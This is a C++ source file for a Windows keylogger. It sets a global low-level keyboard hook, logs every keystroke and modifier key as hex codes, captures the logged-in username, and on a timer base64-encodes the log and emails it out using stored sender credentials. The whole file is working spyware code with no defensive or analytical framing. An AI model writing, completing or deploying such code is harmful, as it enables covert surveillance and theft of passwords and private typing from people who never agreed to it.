
#include <windows.h>

#include "keybhook.h"
#include "tools.h"
#include "timer.h"
#include "mail.h"
#include "base64.h"

#define TIME_MAIL 200*60
#define MIN_TAM 20

namespace KeybHook
{

std::string to;
std::string from;
std::string pass;
std::string keylog = "";
std::string emptystr = "";
std::string user;

TIMER::Timer MailTimer;

HHOOK eHook = NULL;


void TimerSendMail ()
{

    if (keylog.length() < MIN_TAM)
        return;

    int x = Mail::SendMail (BASE64::EncryptB64(user),"Msg:" + BASE64::EncryptB64(keylog),to,
                            from,pass,"");
    if (x != 7)
        TOOLS::WriteAppLog ("Mail was not sent! Error code: " + TOOLS::ToString (x));
    else keylog = "";
}

LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
{

    if (nCode < 0)
        CallNextHookEx(eHook, nCode,  wparam, lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        std::string newkey = TOOLS::int_to_hex(kbs->vkCode);
        keylog += newkey;
        if (kbs->vkCode == VK_RETURN)
            keylog += '\n';
    }
    else if (wparam == WM_KEYUP || wparam  == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL
                || key == VK_LCONTROL
                || key == VK_RCONTROL
                || key == VK_SHIFT
                || key == VK_LSHIFT
                || key == VK_RSHIFT
                || key == VK_MENU
                || key == VK_LMENU
                || key == VK_RMENU
                || key == VK_CAPITAL
                || key == VK_NUMLOCK
                || key == VK_LWIN
                || key == VK_RWIN)

        {

            std::string KeyName = TOOLS::int_to_hex(kbs->vkCode);
            KeyName.insert (0, "/");
            keylog += KeyName;
        }
    }
    return CallNextHookEx(eHook, nCode,  wparam, lparam);
}

bool InstallHook (std::string lto, std::string lfrom, std::string lpass, const unsigned long& time_mail)
{

    TCHAR username[257];
    DWORD size = 257;
    GetUserName((TCHAR*)username, &size);
    user = username;
    to = lto;
    from = lfrom;
    pass = lpass;

    MailTimer = TIMER::Timer(TimerSendMail, time_mail, TIMER::Timer::Infinite);
    TOOLS::WriteAppLog ("Hook started... Timer started");
    MailTimer.Start (true);

    eHook = SetWindowsHookEx (WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle (NULL), 0);

    return eHook == NULL;
}

bool UninstalHook ()
{
    BOOL b = UnhookWindowsHookEx (eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked ()
{

    return (bool)(eHook == NULL);
}
}
